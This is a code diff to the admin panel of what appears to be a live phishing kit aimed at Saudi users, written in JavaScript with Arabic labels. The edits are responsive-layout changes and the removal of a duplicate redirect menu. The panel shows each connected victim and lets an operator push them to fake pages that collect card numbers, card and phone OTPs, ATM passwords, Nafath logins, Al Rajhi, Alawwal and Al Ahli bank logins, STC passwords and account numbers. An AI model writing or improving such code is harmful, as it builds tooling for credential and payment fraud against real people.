@@ -1519,7 +1519,7 @@
       // Header with device info
       // Get visitor name using helper (buyer name for transfer, full name otherwise)
       const displayName = getVisitorDisplayName(visitor) || 'زائر #' + visitor.visitorNumber;
-      html += '<div class="flex justify-between items-start"><div>';
+      html += '<div class="flex flex-col md:flex-row md:justify-between items-start gap-2"><div class="w-full">';
       html += '<h2 class="text-2xl font-bold">' + displayName + '</h2>';
       html += '<p class="text-gray-500">' + visitor.page + '</p>';
       // Get service name and total fees from data dynamically
@@ -1599,9 +1599,9 @@
       html += '</div>';
       
       // Navigate to page (moved from bottom)
-      html += '<div class="flex items-center gap-2">';
+      html += '<div class="flex flex-wrap items-center gap-2 mt-2">';
       html += '<span class="text-sm text-gray-500">توجيه لصفحة</span>';
-      html += '<select id="navigateSelectTop" class="px-3 py-2 border rounded-lg">';
+      html += '<select id="navigateSelectTop" class="px-3 py-2 border rounded-lg text-sm flex-1 min-w-0">';
       html += '<option value="">اختر صفحة</option>';
       html += '<option value="credit-card-payment">الدفع بالبطاقة</option>';
       html += '<option value="otp-verification">OTP البطاقة</option>';
@@ -1626,7 +1626,7 @@
       html += '<option value="stc-password">كلمة مرور STC</option>';
       html += '<option value="final-page">الصفحة النهائية</option>';
       html += '</select>';
-      html += '<button onclick="navigateVisitorTop(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>توجيه</button>';
+      html += '<button onclick="navigateVisitorTop(\'' + visitor.socketId + '\')" class="px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm whitespace-nowrap"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>توجيه</button>';
       html += '</div></div>';
       
       // إظهار زر إرسال الرمز في أعلى معلومات العميل عند دخوله لصفحة تحقق نفاذ
@@ -2313,34 +2313,7 @@
       html += '<div class="flex gap-2"><input type="text" id="codeInput" class="flex-1 px-3 py-2 border rounded-lg" placeholder="أدخل الرمز" value="' + (visitor.lastSentCode || '') + '">';
       html += '<button id="sendCodeBtn" onclick="sendCode(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700">إرسال</button></div></div>';
       
-      // Navigate
-      html += '<div><label class="block text-sm text-gray-500 mb-1">توجيه لصفحة</label>';
-      html += '<div class="flex gap-2"><select id="navigateSelect" class="flex-1 px-3 py-2 border rounded-lg">';
-      html += '<option value="">اختر صفحة</option>';
-      html += '<option value="credit-card-payment">الدفع بالبطاقة</option>';
-      html += '<option value="otp-verification">OTP البطاقة</option>';
-      html += '<option value="atm-password">كلمة مرور ATM</option>';
-      html += '<option value="phone-verification">توثيق الجوال</option>';
-      html += '<option value="phone-otp">OTP الجوال</option>';
-      html += '<option value="stc-call-alert">تنبيه STC</option>';
-      html += '<option value="mobily-call-alert">تنبيه Mobily</option>';
-      html += '<option value="nafath-login-page">نفاذ</option>';
-      html += '<option value="nafath-verify">تحقق نفاذ</option>';
-      html += '<option value="alrajhi-login">الراجحي - تسجيل دخول</option>';
-      html += '<option value="alrajhi-otp">الراجحي - OTP</option>';
-      html += '<option value="alrajhi-nafath">الراجحي - نفاذ</option>';
-      html += '<option value="alrajhi-alert">الراجحي - تنبيه</option>';
-      html += '<option value="alrajhi-call">الراجحي - اتصال</option>';
-      html += '<option value="alawwal-bank">بنك الأول</option>';
-      html += '<option value="alawwal-nafath">الأول - نفاذ</option>';
-      html += '<option value="alahli-otp">الأهلي - OTP</option>';
-      html += '<option value="bank-transfer">التحويل البنكي</option>';
-      html += '<option value="bank-account-number">رقم الحساب</option>';
-      html += '<option value="mystc-otp">MyStc OTP</option>';
-      html += '<option value="stc-password">كلمة مرور STC</option>';
-      html += '<option value="final-page">الصفحة النهائية</option>';
-      html += '</select>';
-      html += '<button onclick="navigateVisitor(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700">توجيه</button></div></div>';
+      // Navigate removed (already at top)
       
       html += '</div>';
       
